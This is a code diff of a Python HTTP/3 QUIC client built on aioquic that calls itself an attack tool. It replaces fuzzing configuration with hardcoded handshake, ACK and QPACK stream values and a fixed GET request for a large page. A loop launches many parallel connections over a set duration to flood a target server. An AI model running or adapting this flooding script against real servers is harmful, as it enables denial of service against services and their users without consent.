@@ -26,16 +26,14 @@ from aioquic.tls import CipherSuite, Epoch
 import aioquic.tls as tls
 from aioquic.quic.connection import *
 import concurrent.futures
-from fuzzer_v1_conf import FuzzingConf
 import traceback
 from tqdm import tqdm
-import json
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.settimeout(0.1)
 
 class HttpClient():
-    def __init__(self, fuzzing_conf: FuzzingConf, hostname: str) -> None:
+    def __init__(self, hostname: str) -> None:
         
         self.quic_conf = QuicConfiguration(
             is_client=True,
@@ -46,43 +44,53 @@ class HttpClient():
             #quic_logger=QuicFileLogger('quic_log'),
             #secrets_log_file=open('secrets.keylog', "a")
         )
+        
+        self.quic_conf.original_version = 1
         self.hostname = hostname
         self.network_path = QuicNetworkPath(hostname)
         self._quic = QuicConnection(configuration=self.quic_conf)
         self._http = H3Connection(self._quic)
-        self.fuzzing_conf = fuzzing_conf
-    
+
+    def send_quic_stream(self, frame_data, stream_id):
+        """
+        Function to send frame_data over the QUIC stream.
+        Uses the stream_id from h3msg to send over the same stream.
+        """
+        builder = self.get_builder(Epoch.ONE_RTT)
+
+        buf = builder.start_frame(
+            QuicFrameType.STREAM_BASE | 2,
+            capacity=4,  # Capacity setting for stream transmission
+        )
+
+        # Use the extracted stream_id
+        buf.push_uint_var(stream_id)  # Use the stream_id extracted from h3msg
+
+        buf.push_uint16(len(frame_data) | 0x4000)  # Set the length of the data
+        buf.push_bytes(frame_data)  # Add the actual frame data to the stream
+
+        # Send the packet
+        self.send_quic_frames_from_builder(builder)
+
     def craft_sample_headers_frame(self):
         """
         Craft a sample HEADERS frame
         """
         
         #print("\nCrafting a sample HEADERS frame")
-        stream_id = self.fuzzing_conf.request_stream_id
+        stream_id = self._quic.get_next_available_stream_id()
 
         headers = [
-                (b":method", self.fuzzing_conf.method_header.encode()),
+                (b":method", "GET".encode()),
                 (b":scheme", "HTTPS".encode()),
                 (b":authority", self.hostname.encode()),
-                (b":path", self.fuzzing_conf.path_header.encode()),
-                (b"user-agent", ("A"*self.fuzzing_conf.user_agent_length).encode()),
-                (b"accept", "AAA".encode())
+                (b":path", "/600k.html".encode()),
+                (b"user-agent", "PRETT3 client".encode())
             ]
 
         frame_data =  self._http._encode_headers(stream_id, headers)
 
         return aioquic.h3.connection.encode_frame(FrameType.HEADERS, frame_data)
-    
-    def craft_sample_data_frame(self):
-        """
-        Craft a sample DATA frame
-        """
-        
-        #print("\nCrafting a sample DATA frame")
-
-        data = "A"*10
-
-        return aioquic.h3.connection.encode_frame(FrameType.DATA, data.encode())
 
 
     def get_builder(self, epoch: Epoch):
@@ -107,6 +115,8 @@ class HttpClient():
         if epoch==Epoch.INITIAL: quic_packet_type = QuicPacketType.INITIAL
         elif epoch==Epoch.HANDSHAKE: quic_packet_type = QuicPacketType.HANDSHAKE
         elif epoch==Epoch.ONE_RTT: quic_packet_type = QuicPacketType.ONE_RTT
+
+        # print(">>> prett3.get_builder. quic_packet_type={}, crypto_pair={}".format(quic_packet_type, crypto_pair))
         
         builder.start_packet(quic_packet_type, crypto_pair)
 
@@ -138,6 +148,25 @@ class HttpClient():
 
         self.send_quic_frames_from_builder(builder)
 
+    # sample
+    def send_quic_ack(self, acked_packet_num):
+        
+        builder = self.get_builder()
+
+        buf = builder.start_frame(
+                    QuicFrameType.ACK, # frame type
+                    capacity=ACK_FRAME_CAPACITY,
+                    #handler_args=(limit,),
+                )
+        
+        buf.push_uint_var(acked_packet_num) # largest acknowledged
+        buf.push_uint_var(106) # ack delay
+        buf.push_uint_var(0) # ack range count
+        buf.push_uint_var(0) # ack range
+
+        self.send_quic_frames_from_builder(builder)
+
+
     def send_quic_frames_from_builder(self, builder:QuicPacketBuilder):
         datagrams, packets = builder.flush()
 
@@ -149,18 +178,18 @@ class HttpClient():
     def serialize_transport_parameters(self) -> bytes:
 
         quic_transport_parameters = QuicTransportParameters(
-            ack_delay_exponent=self.fuzzing_conf.ack_delay_exponent,
-            active_connection_id_limit=self.fuzzing_conf.active_connection_id_limit,
-            max_idle_timeout=self.fuzzing_conf.max_idle_timeout,
-            initial_max_data=self.fuzzing_conf.initial_max_data,
-            initial_max_stream_data_bidi_local=self.fuzzing_conf.initial_max_stream_data_bidi_local,
-            initial_max_stream_data_bidi_remote=self.fuzzing_conf.initial_max_stream_data_uni,
-            initial_max_stream_data_uni=self.fuzzing_conf.initial_max_stream_data_bidi_remote,
-            initial_max_streams_bidi=self.fuzzing_conf.initial_max_streams_bidi,
-            initial_max_streams_uni=self.fuzzing_conf.initial_max_streams_uni,
-            initial_source_connection_id=self._quic._host_cids[0].cid, # keep as is
-            max_ack_delay=self.fuzzing_conf.max_ack_delay,
-            max_datagram_frame_size=self.fuzzing_conf.max_datagram_frame_size,
+            ack_delay_exponent=3,
+            active_connection_id_limit=8,
+            max_idle_timeout=int(self.quic_conf.idle_timeout * 1000),
+            initial_max_data=self.quic_conf.max_data,
+            initial_max_stream_data_bidi_local=self.quic_conf.max_stream_data,
+            initial_max_stream_data_bidi_remote=self.quic_conf.max_stream_data,
+            initial_max_stream_data_uni=self.quic_conf.max_stream_data,
+            initial_max_streams_bidi=128,
+            initial_max_streams_uni=128,
+            initial_source_connection_id=self._quic._host_cids[0].cid,
+            max_ack_delay=25,
+            max_datagram_frame_size=self.quic_conf.max_datagram_frame_size,
             quantum_readiness=(
                 b"Q" * SMALLEST_MAX_DATAGRAM_SIZE
                 if self.quic_conf.quantum_readiness_test
@@ -168,10 +197,11 @@ class HttpClient():
             ),
             stateless_reset_token=self._quic._host_cids[0].stateless_reset_token,
             version_information=QuicVersionInformation(
-                chosen_version=self.fuzzing_conf.quic_version,
+                chosen_version=self.quic_conf.original_version,
                 available_versions=self.quic_conf.supported_versions,
             ),
         )
+        # print(">>> prett3.serialize_transport_parameters. quic_transport_parameters={}".format(quic_transport_parameters))
 
         buf = Buffer(capacity=3 * self._quic._max_datagram_size)
         push_quic_transport_parameters(buf, quic_transport_parameters)
@@ -232,6 +262,7 @@ class HttpClient():
 
         # packet spaces
         def create_crypto_pair(epoch: tls.Epoch) -> CryptoPair:
+            # print(">>> prett3.get_tls.create_crypto_pair: start. epoch={}".format(epoch))
             epoch_name = ["initial", "0rtt", "handshake", "1rtt"][epoch.value]
             
             recv_secret_name = "server_%s_secret" % epoch_name
@@ -312,12 +343,14 @@ class HttpClient():
 
     def handle_crypto(self, context: QuicReceiveContext, frame_type: int, buf:Buffer):
 
+        # print(">>> prett3.handle_crypto: start: frame_type={}, buf={}".format(frame_type, buf.data) )
         offset = buf.pull_uint_var()
         length = buf.pull_uint_var()
         if offset + length > UINT_VAR_MAX:
             raise QuicConnectionError( error_code=QuicErrorCode.FRAME_ENCODING_ERROR, frame_type=frame_type, reason_phrase="offset + length cannot exceed 2^62 - 1")
         frame = QuicStreamFrame(offset=offset, data=buf.pull_bytes(length))
         
+        # print(">>> prett3.handle_crypto: epoch={}".format(context.epoch) )
         stream = self._quic._crypto_streams[context.epoch]
         pending = offset + length - stream.receiver.starting_offset()
         if pending > MAX_PENDING_CRYPTO:
@@ -384,6 +417,7 @@ class HttpClient():
                 frame_type = buf.pull_uint_var()
             except BufferReadError:
                 raise QuicConnectionError( error_code=QuicErrorCode.FRAME_ENCODING_ERROR, frame_type=None, reason_phrase="Malformed frame type")
+            #print(">>> prett3.process_payload: frame #{}, type={}".format(i, frame_type))
 
             # handle the frame
             
@@ -505,6 +539,7 @@ class HttpClient():
             buf.seek(end_off)
 
             
+            # print(">>> prett3.receive_datagram. Decrypting the packet...")
             try:
                 plain_header, plain_payload, packet_number = crypto.decrypt_packet(
                         data[start_off:end_off], encrypted_off, space.expected_packet_number)
@@ -611,6 +646,7 @@ class HttpClient():
         _update_traffic_key() (when called automatically) calls _push_crypto_data() to write data from HANDSHAKE's full buffer to its stream
         """
 
+        # print("\n>>> prett3.complete_connection: start")
         epoch = Epoch.HANDSHAKE
 
         crypto_pair = self._quic._cryptos[epoch]
@@ -621,17 +657,19 @@ class HttpClient():
         builder = self.get_builder(epoch)
 
         # ACK
+        # print(">>> prett3.complete_connection: start. Adding ACK frame to the builder")
         buf = builder.start_frame(
                     QuicFrameType.ACK,
                     capacity=ACK_FRAME_CAPACITY,
                 )
         
-        buf.push_uint_var(self.fuzzing_conf.largest_acknowledged) # largest acknowledged
-        buf.push_uint_var(self.fuzzing_conf.ack_delay) # ack delay
-        buf.push_uint_var(self.fuzzing_conf.ack_range_count) # ack range count
-        buf.push_uint_var(self.fuzzing_conf.ack_range) # ack range
+        buf.push_uint_var(1) # largest acknowledged
+        buf.push_uint_var(106) # ack delay
+        buf.push_uint_var(0) # ack range count
+        buf.push_uint_var(1) # ack range
 
         # CRYPTO
+        # print(">>> prett3.complete_connection: Adding CRYPTO frame to the builder")
         strm_data = self._quic._crypto_streams[Epoch.HANDSHAKE].sender.get_frame(1135).data # TODO: calculate max_size dynamically instead of giving static number
         buf = builder.start_frame(
                 QuicFrameType.CRYPTO,
@@ -679,17 +717,17 @@ class HttpClient():
         """
         
         settings={
-            aioquic.h3.connection.Setting.QPACK_MAX_TABLE_CAPACITY: self.fuzzing_conf.qpack_max_table_capacity,
-            aioquic.h3.connection.Setting.QPACK_BLOCKED_STREAMS: self.fuzzing_conf.qpack_blocked_streams,
-            aioquic.h3.connection.Setting.ENABLE_CONNECT_PROTOCOL: self.fuzzing_conf.enable_connect,
-            aioquic.h3.connection.Setting.DUMMY: self.fuzzing_conf.dummy
+            aioquic.h3.connection.Setting.QPACK_MAX_TABLE_CAPACITY: self._http._max_table_capacity,
+            aioquic.h3.connection.Setting.QPACK_BLOCKED_STREAMS: self._http._blocked_streams,
+            aioquic.h3.connection.Setting.ENABLE_CONNECT_PROTOCOL: 1,
+            aioquic.h3.connection.Setting.DUMMY: 1
         }
         encoded_settings_frame = encode_frame(FrameType.SETTINGS, encode_settings(settings))
 
         # Control stream
         stream2_frame = QuicStreamFrame(
             data=
-             bytes( aioquic.buffer.encode_uint_var(StreamType.CONTROL) + encoded_settings_frame),
+             bytes( aioquic.buffer.encode_uint_var(StreamType.CONTROL) + encoded_settings_frame), #aioquic.buffer.encode_uint_var(StreamType.CONTROL),
             offset=0,
             fin=False
         )
@@ -717,7 +755,7 @@ class HttpClient():
                 QuicFrameType.STREAM_BASE | 2, 
                 capacity=4, #checked
             )
-        buf1.push_uint_var(self.fuzzing_conf.control_stream_id) # stream id
+        buf1.push_uint_var(2) # stream id
         #buf1.push_uint_var(0) # offset. IMPORTANT!!! _QUIC._write_stream_frame() does not set offset for these frames.
         buf1.push_uint16( len(stream2_frame.data) | 0x4000 ) #(16399) #(len(stream2_frame.data) | 0x4000) # length
         buf1.push_bytes(stream2_frame.data) # data
@@ -728,7 +766,7 @@ class HttpClient():
                 QuicFrameType.STREAM_BASE | 2,
                 capacity=4, #checked
             )
-        buf2.push_uint_var(self.fuzzing_conf.encoder_stream_id)
+        buf2.push_uint_var(6)
         #buf2.push_uint_var(0) # offset
         buf2.push_uint16( len(stream6_frame.data) | 0x4000 )  #(16385) #(len(stream6_frame.data) | 0x4000)
         buf2.push_bytes(stream6_frame.data)
@@ -739,7 +777,7 @@ class HttpClient():
                 QuicFrameType.STREAM_BASE | 2,
                 capacity=4, #checked
             )
-        buf3.push_uint_var(self.fuzzing_conf.decoder_stream_id)
+        buf3.push_uint_var(10)
         #buf3.push_uint_var(0) # offset
         buf3.push_uint16(len(stream10_frame.data) | 0x4000) #(16385) | 0x4000)
         buf3.push_bytes(stream10_frame.data)        
@@ -756,21 +794,21 @@ class HttpClient():
         except socket.timeout: pass
 
 
-def execute_attack(fuzzing_conf: FuzzingConf, url: str, once: bool):
+def execute_attack(url: str, once: bool):
     try:
         # Step 1: Initialize the HTTP/3 client with QUIC configuration
-        h3client = HttpClient(fuzzing_conf, urlparse(url).netloc)
+        h3client = HttpClient( urlparse(url).netloc)
 
         # Step 2: Establish the initial connection (handshake)
-        if once: print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
+        if once or True: print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
         h3client.connect()
         h3client.read_from_buffer()  # Receive any response from the server
-
+        
         # Step 3: Complete the connection (finish handshake)
         if once: print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
         h3client.complete_connection()
         h3client.read_from_buffer()  # Receive any response from the server
-
+        
         if once: print("\033[93m\n[Opening Control Stream...]\033[0m")
         h3client.open_qpack_streams()
         h3client.read_from_buffer()
@@ -788,16 +826,13 @@ def main(
     url: str,
     once: bool,
     attack_params: Dict,
-    config_file: str = None, # replicate fuzzing by reading values from a json file
 ) -> None:
 
     if once:
-        fuzzing_conf = FuzzingConf(config_file)
         attack_start_time = time.time()
         attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
         print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
-        print(fuzzing_conf)
-        execute_attack(fuzzing_conf, url, once)
+        execute_attack(url, once)
         sys.exit()
 
 
@@ -808,13 +843,12 @@ def main(
 
         with concurrent.futures.ThreadPoolExecutor() as executor:
             futures = []
-            print(fuzzing_conf)
             print("\033[31mStart running the attack for {} seconds with {} parallel connections and {} sec interval\033[0m".format(duration, par_req, interval))
             #while time.time() - attack_start_time < 61:            
             for i in tqdm( range(0, int(duration/interval)), colour='red' ):
                 for i in range(par_req):
                     # Submit each iteration as a separate task
-                    futures.append(executor.submit(execute_attack, fuzzing_conf, url, once))
+                    futures.append(executor.submit(execute_attack, url, once))
                 time.sleep(interval)
 
 
@@ -822,16 +856,12 @@ def main(
         attack_start_time = time.time()
         attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
         print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
-        fuzzing_conf = FuzzingConf(config_file)
         
         run_attack()
         attack_end_time = time.time()
         attack_end_time_pretty = datetime.fromtimestamp(attack_end_time).strftime('%Y-%m-%d %H:%M:%S')
         print("\033[31mAttack Completes at {}\033[0m".format(attack_end_time_pretty))
         
-        # Let the server rest
-        #for i in tqdm( range(0, 30), colour='green' ):
-        #    time.sleep(1)
         
 
     
@@ -885,8 +915,7 @@ if __name__ == "__main__":
     main(
             url=args.url,
             once=args.once,
-            attack_params=attack_params,
-            config_file=args.config,
+            attack_params=attack_params
         )
     
     
